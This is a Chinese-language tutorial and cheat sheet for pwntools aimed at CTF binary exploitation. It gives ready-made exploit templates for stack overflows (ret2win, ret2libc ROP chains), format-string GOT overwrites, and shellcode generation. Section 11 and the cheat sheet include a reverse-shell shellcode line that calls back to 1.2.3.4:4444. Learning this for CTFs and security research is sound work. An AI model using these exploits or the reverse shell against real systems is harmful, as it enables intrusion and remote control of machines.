# pwntools 实战使用指南

> PWN 题的 Python 框架——从连接管理到 payload 构造、从 ELF 解析到 ROP 链组装，所有模板开箱即用。CTF PWN 方向、二进制漏洞利用的标配。

---

## 目录

- [一、pwntools 是什么](#一pwntools-是什么)
- [二、安装与环境配置](#二安装与环境配置)
- [三、核心工作流总览](#三核心工作流总览)
- [四、连接管理（process / remote）](#四连接管理process--remote)
- [五、context 全局配置](#五context-全局配置)
- [六、IO 交互（send / recv）](#六io-交互send--recv)
- [七、ELF 文件操作](#七elf-文件操作)
- [八、payload 打包（p32 / p64 / u64）](#八payload-打包p32--p64--u64)
- [九、ROP 链构造](#九rop-链构造)
- [十、格式化字符串（fmtstr_payload）](#十格式化字符串fmtstr_payload)
- [十一、shellcraft 与 asm](#十一shellcraft-与-asm)
- [十二、GDB 调试 attach](#十二gdb-调试-attach)
- [十三、完整实战模板](#十三完整实战模板)
- [十四、实战技巧与注意事项](#十四实战技巧与注意事项)
- [十五、速查表](#十五速查表)

---

## 一、pwntools 是什么

pwntools 是 Gallopsled 团队开发的 CTF 框架，专为二进制漏洞利用设计。它的核心能力：**用 Python 一行连接目标、几行构造 payload、自动处理大小端序和地址打包，把精力放在漏洞逻辑而非模板代码上**。

在 CTF 与安全工作中的典型场景：

- PWN 题：栈溢出、格式化字符串、堆利用、ROP
- 漏洞利用开发：写 PoC 验证 CVE
- 二进制自动化：批量 fuzz、自动化利用

### pwntools vs 原生 socket

| 维度 | pwntools | 原生 socket |
|------|----------|-------------|
| 连接 | `remote(ip, port)` | `socket.socket()` + `connect()` |
| 收发 | `recvuntil`/`sendline` | 手动 `recv` + 拼缓冲区 |
| 打包 | `p64(addr)` | `struct.pack('<Q', addr)` |
| ELF 解析 | `ELF('./binary').got['puts']` | 手动 readelf/解析 |
| ROP | `ROP(elf).call(system, ['/bin/sh'])` | 手工拼 gadget |
| 调试 | `gdb.attach(p)` | 手动开终端 |

> 💡 **结论**：写 PWN 必用 pwntools，省 90% 模板代码。

---

## 二、安装与环境配置

```bash
# Python 3.8+
pip3 install pwntools

# 验证
python3 -c "from pwn import *; print(pwnlib.__version__)"

# Kali Linux 通常已预装
```

### 配套环境

```bash
# GDB + pwndbg（动态调试必备）
git clone https://github.com/pwndbg/pwndbg.git
cd pwndbg && ./setup.sh

# ROPgadget（找 gadget）
pip3 install ROPgadget

# one_gadget（找 execve gadget）
gem install one_gadget

# checksec（查保护，pwntools 也内置）
pip3 install checksec.py
# 或用 pwntools: checksec('./pwn')
```

### 首次使用注意

```python
from pwn import *
# 这会导入大量符号到全局命名空间，正常行为
# 会有一些警告，可忽略

# 关闭烦人的日志
context.log_level = 'error'   # error / warning / info / debug
```

---

## 三、核心工作流总览

PWN 题标准流程：

1. **查保护**：`checksec('./pwn')` 看 NX/PIE/Canary/RELRO
2. **逆向**：IDA 看漏洞点（gets/scanf/printf 格式串）
3. **连接**：本地 `process('./pwn')` 或远程 `remote(ip, port)`
4. **找偏移**：`cyclic(500)` + GDB 看崩溃点
5. **构造 payload**：填充 + 返回地址 / ROP 链
6. **发送**：`sendline(payload)`
7. **拿 Shell**：`p.interactive()`

---

## 四、连接管理（process / remote）

### 1. 本地连接

```python
from pwn import *

# 启动本地二进制
p = process('./pwn')

# 带参数
p = process(['./pwn', 'arg1', 'arg2'])

# 带环境变量
p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})

# 指定解释器（不同 libc）
p = process('./pwn', env={'LD_LIBRARY_PATH': './'})
```

### 2. 远程连接

```python
# 连远程题目
p = remote('challenge.ctf.com', 9999)

# 走代理（如 SSH 隧道）
p = remote('127.0.0.1', 9999)

# SSL/TLS
p = remote('challenge.ctf.com', 443, ssl=True)
```

### 3. 命令行参数切换（推荐模板）

```python
from pwn import *
import sys

# 本地：python3 exp.py
# 远程：python3 exp.py REMOTE 1.2.3.4 9999
# GDB：python3 exp.py GDB

def start():
    if args.GDB:
        return gdb.debug('./pwn', gdbscript='''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

io = start()
```

### 4. 关闭连接

```python
p.close()           # 显式关闭
# 或用上下文管理器
with process('./pwn') as p:
    p.sendline(b'hello')
    print(p.recvline())
```

---

## 五、context 全局配置

`context` 是 pwntools 的全局配置，影响所有操作。

```python
from pwn import *

# 架构（影响 p64/asm/shellcode）
context.arch = 'amd64'     # amd64 / i386 / arm / aarch64 / mips
# 或自动从二进制读取
context.binary = ELF('./pwn')   # 自动设置 arch/os

# 操作系统
context.os = 'linux'

# 日志级别
context.log_level = 'debug'     # debug / info / warning / error
context.log_level = 'info'      # 默认，建议比赛用 info

# 终端（gdb.attach 时用）
context.terminal = ['tmux', 'splitw', '-h']   # tmux 水平分屏
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']  # GNOME

# 字节序（一般不用改）
context.endian = 'little'
context.bits = 64              # 配合 arch，一般不用单独设
```

### 一行配置

```python
context(arch='amd64', os='linux', log_level='info')
```

---

## 六、IO 交互（send / recv）

### 1. 发送

```python
p.send(b'data')           # 发送原始数据（不加换行）
p.sendline(b'data')       # 发送数据 + \n
p.sendlineafter(b'> ', b'data')   # 等到收到 '> ' 再发送
p.sendafter(b'> ', b'data')       # 等到收到 '> ' 再发送（不加换行）

# 发送并打印
p.sendline(b'payload')    # 默认会打印发送内容（log_level >= info）
```

### 2. 接收

```python
p.recv(1024)              # 接收最多 1024 字节
p.recvall()               # 接收直到连接关闭（阻塞）
p.recvline()              # 接收一行（含 \n）
p.recvlines(5)            # 接收 5 行
p.recvuntil(b'flag{')     # 接收直到遇到 'flag{'（返回含该串）
p.recvuntil(b'}')         # 配合上面接收完整 flag
p.recvn(100)              # 精确接收 100 字节
```

### 3. 接收 + 超时

```python
p.recv(timeout=2)         # 最多等 2 秒
p.recvuntil(b'> ', timeout=5)   # 5 秒内等到 '> '，否则抛异常
```

### 4. 交互模式

```python
p.interactive()           # 进入交互模式，手动输入输出
# 相当于直接连到目标的 shell
# Ctrl+C 退出
```

### 5. 实用辅助函数（建议自己封装）

```python
def sla(delim, data):
    """sendlineafter 简写"""
    return p.sendlineafter(delim, data)

def sa(delim, data):
    """sendafter 简写"""
    return p.sendafter(delim, data)

def ru(delim):
    """recvuntil 简写"""
    return p.recvuntil(delim)
```

### 6. 处理回显

```python
# 发送后立即收到的回显（题目 echo 输入）
p.sendline(b'payload')
p.recvline()              # 丢掉回显
data = p.recvline()       # 真正的响应
```

---

## 七、ELF 文件操作

`ELF` 类能解析二进制，直接拿地址，省去手动 readelf。

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 符号地址
elf.symbols['main']            # main 函数地址
elf.symbols['win']             # 后门函数地址
elf.entry                       # 入口点

# PLT / GOT
elf.plt['puts']                # puts 的 PLT 地址
elf.got['puts']                # puts 的 GOT 地址
elf.plt['system']
elf.got['system']

# 搜索字符串/字节
next(elf.search(b'/bin/sh'))   # 找 /bin/sh 字符串地址
next(elf.search(b'flag'))      # 找 flag 字符串
next(elf.search(asm('pop rdi; ret')))  # 找特定字节序列

# 搜索函数
# 找 libc 里的 system
libc.symbols['system']
next(libc.search(b'/bin/sh\x00'))

# 地址计算（libc 偏移）
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
```

### PIE 处理

```python
elf = ELF('./pwn')
# 如果 PIE 开启，symbols 返回的是相对偏移
# 需要泄露一个地址才能算出基址
# 例：泄露了 main 真实地址
main_real = 0x5555555551a0
elf.address = main_real - elf.symbols['main']
# 之后 elf.symbols['win'] 自动返回真实地址
win_addr = elf.symbols['win']
```

---

## 八、payload 打包（p32 / p64 / u64）

地址和数值的打包解包，pwntools 自动处理大小端序。

### 1. 打包（数字 → 字节）

```python
from pwn import *

p32(0x41414141)        # b'AAAA'        （32 位小端）
p64(0x41414141)        # b'AAAA\x00\x00\x00\x00'（64 位小端）

p16(0x1234)            # b'\x34\x12'    （16 位）
p8(0x41)               # b'A'           （8 位）

# 大端序（网络字节序，按需）
p32(0x41414141, endian='big')   # b'AAAA'
```

### 2. 解包（字节 → 数字）

```python
u32(b'AAAA')           # 0x41414141
u64(b'AAAA\x00\x00\x00\x00')    # 0x41414141
u16(b'\x34\x12')       # 0x1234
u8(b'A')               # 0x41

# 处理 libc 泄露（6 字节地址，补 0 到 8 字节）
leaked = p.recv(6)
addr = u64(leaked.ljust(8, b'\x00'))   # 右补 0
```

### 3. 其他打包

```python
# 拼接多个
flat(0x41414141, 0x42424242, 0x43434343)
# b'AAAABBBBCCCC'

# 按架构自动选 p32/p64
flat([1, 2, 3])        # context.arch 决定
```

### 4. 字符串转字节

```python
b'hello'               # 直接字面量
'hello'.encode()       # str → bytes
```

---

## 九、ROP 链构造

### 1. 手工构造（基础）

```python
from pwn import *

# 找 gadget
# ROPgadget --binary pwn | grep "pop rdi"
pop_rdi = 0x401233     # ROPgadget 找到的地址
ret = 0x40101a         # 一个 ret，用于栈对齐

# ret2win：跳到后门函数
win = elf.symbols['win']
payload = b'A' * offset + p64(win)

# ret2system：system("/bin/sh")
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']
payload = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret)        # 栈对齐（Ubuntu 18.04+ 需要）
payload += p64(system)
```

### 2. 用 ROP 类（推荐）

```python
from pwn import *

elf = ELF('./pwn')
rop = ROP(elf)

# 自动找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 方法1：手工 + ROP 找 gadget
rop.raw(pop_rdi)
rop.raw(next(elf.search(b'/bin/sh')))
rop.raw(ret)           # 对齐
rop.raw(elf.plt['system'])
payload = b'A' * offset + rop.chain()

# 方法2：高级 API（自动找 gadget）
rop.call(system, [next(elf.search(b'/bin/sh'))])
# 或
rop.call('system', ['/bin/sh'])
payload = b'A' * offset + rop.chain()

# 多个调用
rop.call('puts', [elf.got['puts']])
rop.call('main')       # 返回 main 再打一次
payload = b'A' * offset + rop.chain()
```

### 3. ret2libc 完整流程

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]

# 第一步：泄露 puts@got
payload = b'A' * 72
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])   # 回 main

p.sendlineafter(b'input: ', payload)
p.recvline()                          # 丢掉回显
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

# 第二步：算 libc 基址
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"libc base @ {hex(libc_base)}")

# 第三步：再溢出调 system("/bin/sh")
payload2 = b'A' * 72
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(ret)                  # 对齐
payload2 += p64(system)

p.sendlineafter(b'input: ', payload2)
p.interactive()
```

### 4. one_gadget 利用

```python
# 终端: one_gadget libc.so.6
# 输出几个可直接 getshell 的 gadget 地址（相对 libc）
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rcx == NULL

one_gadget_offset = 0x4f2c5
one_gadget = libc_base + one_gadget_offset
payload = b'A' * offset + p64(one_gadget)
# 注意约束条件，可能需要先 pop 调整寄存器
```

---

## 十、格式化字符串（fmtstr_payload）

### 1. 找偏移

```python
# 手动：发送 AAAA%p%p%p%p... 看哪个 0x41414141
# 或用 pwntools
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
print(p.recvline())
# 输出 AAAA0xffe.0x1.0x41414141.... → 偏移是 6
```

### 2. 用 fmtstr_payload 自动构造

```python
from pwn import *

# 任意地址写任意值
# offset: 格式化字符串在栈上的偏移（上一步测的）
# target_addr: 要写入的地址
# target_value: 要写入的值
offset = 6
target_addr = 0x601040
target_value = 0x12345678
payload = fmtstr_payload(offset, {target_addr: target_value})
p.sendline(payload)

# 多个地址同时写
payload = fmtstr_payload(offset, {
    0x601040: 0x12345678,
    0x601044: 0xdeadbeef,
})
```

### 3. fmtstr_payload 参数

```python
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
# offset: 栈偏移
# writes: {addr: value} 字典
# numbwritten: 已打印的字符数（前面有输出时需要）
# write_size: 'byte' / 'short' / 'int'
#   byte: 一次写 1 字节，payload 长但稳定
#   short: 一次写 2 字节
#   int: 一次写 4 字节，payload 短但可能失败

# 例：用 short 减少长度
payload = fmtstr_payload(6, {0x601040: 0x12345678}, write_size='short')
```

### 4. 读取内存

```python
# 读指定地址的内容（泄露）
# 利用 %s 读字符串，或 %p 读值
addr = 0x601040
# 假设偏移是 6，把 addr 放在栈上，用 %6$s 读
payload = p64(addr) + b'%6$s'
p.sendline(payload)
data = p.recvuntil(b'\x00')
```

### 5. 64 位格式化字符串注意事项

64 位下地址含 `\x00`，放前面会被截断。解决方法：

```python
# 把地址放 payload 末尾
# payload = b'AAAAAAAA%6$s' + p64(addr)
# 调整偏移计算
```

---

## 十一、shellcraft 与 asm

### 1. 生成 shellcode

```python
from pwn import *

context.arch = 'amd64'

# 标准 execve("/bin/sh")
sc = asm(shellcraft.sh())
print(f"长度: {len(sc)}")
print(f"hex: {sc.hex()}")

# 自定义命令
sc = asm(shellcraft.cat('/flag'))
sc = asm(shellcraft.execve('/bin/sh', ['sh', '-p'], 0))

# 反弹 shell
sc = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())

# 读文件
sc = asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
```

### 2. 不同架构

```python
context.arch = 'i386'
sc = asm(shellcraft.sh())       # 32 位 shellcode

context.arch = 'arm'
sc = asm(shellcraft.sh())       # ARM shellcode

context.arch = 'aarch64'
sc = asm(shellcraft.sh())       # ARM64 shellcode
```

### 3. asm / disasm

```python
# 汇编
asm('mov rax, 0x3b; syscall')
# b'\xb8\x3b\x00\x00\x00\x0f\x05'

# 反汇编
disasm(b'\xb8\x3b\x00\x00\x00\x0f\x05')
# 0:   b8 3b 00 00 00       mov    eax, 0x3b
# 5:   0f 05                syscall
```

### 4. shellcode 优化

```python
# 避免坏字符（如 \x00 \x0a）
sc = asm(shellcraft.sh())
# 检查是否含坏字符
bad = b'\x00\x0a\x0d'
if any(b in sc for b in bad):
    print("含坏字符，需要用其他方式编码")

# 用 shellcraft.amd64.linux.sh() 的短版
# 或从 shell-storm.org 找更短的
```

---

## 十二、GDB 调试 attach

### 1. 启动时附加

```python
from pwn import *

p = process('./pwn')
# 立即附加 GDB（新开终端）
gdb.attach(p, '''
    b *0x401234
    b main
    continue
''')

input('按回车继续...')   # 等 GDB 准备好
p.sendline(b'payload')
p.interactive()
```

### 2. gdb.debug（推荐）

```python
# 直接在 GDB 下启动二进制
p = gdb.debug('./pwn', gdbscript='''
    b *0x401234
    b vuln
    continue
''')
# 自动打开 GDB 终端，断在断点处
```

### 3. 命令行参数切 GDB

```python
from pwn import *
import sys

def start():
    if args.GDB:
        return gdb.debug('./pwn', '''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

p = start()
```

### 4. 找偏移（cyclic）

```python
from pwn import *

p = process('./pwn')
p.sendline(cyclic(500))
p.wait()             # 等待崩溃

# 读 core dump
core = p.corefile
print(f"crash at: {hex(core.pc)}")          # 崩溃地址
# 或读 rsp 指向的内容
offset = cyclic_find(core.read(core.rsp, 4))
print(f"offset: {offset}")
```

### 5. 实时调试技巧

```python
# 运行中暂停
p.sendline(b'payload')
# 此时去 GDB 终端按 Ctrl+C，可看内存/寄存器

# 在 GDB 中：
# x/20gx $rsp-100    看栈
# x/s 0x601040        看字符串
# info registers      看寄存器
# vmmap               看内存映射
```

---

## 十三、完整实战模板

### 1. 通用模板（推荐收藏）

```python
#!/usr/bin/env python3
"""
pwntools 通用 PWN 模板
用法:
    python3 exp.py            本地
    python3 exp.py GDB        本地 + GDB
    python3 exp.py REMOTE 1.2.3.4 9999   远程
"""
from pwn import *

# ===== 配置 =====
context(arch='amd64', os='linux', log_level='info')
# context(arch='i386', os='linux', log_level='info')   # 32 位

BINARY = './pwn'
elf = ELF(BINARY)
# libc = ELF('./libc.so.6')

# ===== 模式切换 =====
def start():
    if args.GDB:
        return gdb.debug(BINARY, '''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return process(BINARY)

io = start()

# ===== 辅助函数 =====
def sla(delim, data): io.sendlineafter(delim, data)
def sa(delim, data): io.sendafter(delim, data)
def ru(delim): return io.recvuntil(delim)

# ===== 求偏移 =====
# io.sendline(cyclic(500))
# io.wait()
# core = io.corefile
# offset = cyclic_find(core.read(core.rsp, 4))
# log.info(f"offset = {offset}")

# ===== 漏洞利用 =====
offset = 0          # 改成实际偏移

# ret2win
# win = elf.symbols['win']
# payload = b'A' * offset + p64(win)

# ret2libc
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# ret = rop.find_gadget(['ret'])[0]
# ... 见第九章

# ===== 发送 payload =====
# sla(b'input: ', payload)

io.interactive()
```

### 2. ret2win 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
p = process('./pwn')

offset = 72
win = elf.symbols['win']

payload = b'A' * offset + p64(win)
p.sendlineafter(b'input: ', payload)
p.interactive()
```

### 3. ret2libc 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
offset = 72

# 泄露 puts@got
payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendlineafter(b'input: ', payload)
p.recvline()
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(system)
p.sendlineafter(b'input: ', payload2)
p.interactive()
```

### 4. 格式化字符串模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
p = process('./pwn')

# 测偏移
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
leak = p.recvline()
log.info(f"leak: {leak}")
# 找 0x41414141 的位置 → offset

offset = 6
target = elf.got['printf']    # 改 printf@got 为 system
value = elf.plt['system']     # 写入 system 地址（需要先泄露 libc）

payload = fmtstr_payload(offset, {target: value}, write_size='short')
p.sendline(payload)

# 之后输入 /bin/sh 触发 system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

---

## 十四、实战技巧与注意事项

### 1. 标准流程清单

1. `checksec ./pwn` 看保护
2. IDA 找漏洞函数和后门
3. `cyclic(500)` 测偏移
4. 写 exp，先本地 process 测
5. 测通后改 remote 打远程
6. 卡住用 `args.GDB` 动态调试

### 2. 保护机制对应策略

| 保护 | 含义 | 绕过策略 |
|------|------|----------|
| NX | 栈不可执行 | ret2libc / ROP，不能 shellcode |
| PIE | 地址随机化 | 先泄露一个地址算基址 |
| Canary | 栈金丝雀 | 泄露 canary / 格式化字符串读 |
| Full RELRO | GOT 只读 | 不能改 GOT，用 __malloc_hook 等 |

### 3. 栈对齐（Ubuntu 18.04+）

64 位 Ubuntu 的 system 要求 16 字节栈对齐，差一个 ret：

```python
# 加一个 ret gadget 对齐
payload = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret)        # 关键：对齐
payload += p64(system)
```

### 4. 处理不同 libc

```python
# 题目给的 libc 必须用
libc = ELF('./libc-2.31.so')

# 远程 libc 和本地不同 → 用 patchelf 替换本地 libc 测试
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc-2.31.so ./pwn

# 或运行时指定
p = process('./pwn', env={'LD_PRELOAD': './libc-2.31.so'})
```

### 5. 处理输入输出格式

```python
# 题目用 read(0, buf, 0x100) → 不需要换行
p.send(payload)          # 不加 \n

# 题目用 scanf/gets → 需要换行
p.sendline(payload)      # 加 \n

# 题目输出有特定格式
p.recvuntil(b'Your name: ')
p.sendline(b'admin')
p.recvuntil(b'Hello, ')
name = p.recvline()      # 收到的名字
```

### 6. 常见踩坑

- **`u64` 报错**：泄露的字节数不够，用 `leaked.ljust(8, b'\x00')` 补 0
- **system 拿不到 Shell**：栈没对齐，加 `ret` gadget
- **本地通了远程不通**：libc 版本不同，必须用题目给的 libc
- **格式化字符串 64 位失败**：地址含 `\x00` 截断，把地址放末尾
- **gdb.attach 没反应**：没配 `context.terminal`，或没用 tmux
- **PIE 题目偏移不对**：先泄露一个真实地址算 `elf.address`

---

## 十五、速查表

### 导入与配置

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
context.binary = ELF('./pwn')   # 自动设架构
context.terminal = ['tmux', 'splitw', '-h']  # GDB 终端
```

### 连接

```python
p = process('./pwn')                     # 本地
p = process('./pwn', env={'LD_PRELOAD': './libc.so'})  # 指定 libc
p = remote('1.2.3.4', 9999)              # 远程
p = gdb.debug('./pwn', 'b main\ncontinue')  # GDB 调试
gdb.attach(p, 'b *0x401234')             # 附加 GDB
p.interactive()                          # 交互模式
p.close()                                # 关闭
```

### IO

```python
p.send(data)                  # 发送（不换行）
p.sendline(data)              # 发送 + \n
p.sendlineafter(delim, data)  # 等到 delim 再 sendline
p.recv(n)                     # 收 n 字节
p.recvline()                  # 收一行
p.recvuntil(delim)            # 收到 delim
p.recvall()                   # 收到关闭
p.recvn(n)                    # 精确收 n 字节
p.recv(timeout=2)             # 带超时
```

### 打包解包

```python
p32(0x41414141)               # → b'AAAA'
p64(0x41414141)               # → b'AAAA\x00\x00\x00\x00'
u32(b'AAAA')                  # → 0x41414141
u64(b'AAAA\x00\x00\x00\x00') # → 0x41414141
u64(leaked.ljust(8, b'\x00'))# 泄露地址补 0
flat([1, 2, 3])               # 拼接
```

### ELF

```python
elf = ELF('./pwn')
libc = ELF('./libc.so')
elf.symbols['main']           # 函数地址
elf.plt['puts']               # PLT
elf.got['puts']               # GOT
next(elf.search(b'/bin/sh'))  # 搜字符串
elf.entry                     # 入口
# PIE 泄露后：
elf.address = leaked - elf.symbols['main']
```

### ROP

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
rop.call('system', ['/bin/sh'])
rop.raw(p64(pop_rdi) + p64(bin_sh))
payload = b'A' * offset + rop.chain()
```

### 格式化字符串

```python
# 测偏移
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.')
# 自动写
payload = fmtstr_payload(offset, {addr: value})
payload = fmtstr_payload(6, {0x601040: 0x12345678}, write_size='short')
```

### shellcode

```python
sc = asm(shellcraft.sh())              # 标准 shellcode
sc = asm(shellcraft.cat('/flag'))      # 读 flag
sc = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())  # 反弹
disasm(b'\xb8\x3b\x00\x00\x00')       # 反汇编
```

### 找偏移

```python
p.sendline(cyclic(500))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
# 或直接 cyclic_find(core.pc)
```

### 日志

```python
log.info(f"puts @ {hex(leaked)}")      # 信息
log.success("got shell!")              # 成功（绿色）
log.warning("offset may be wrong")     # 警告
log.failure("connection lost")         # 失败（红色）
```
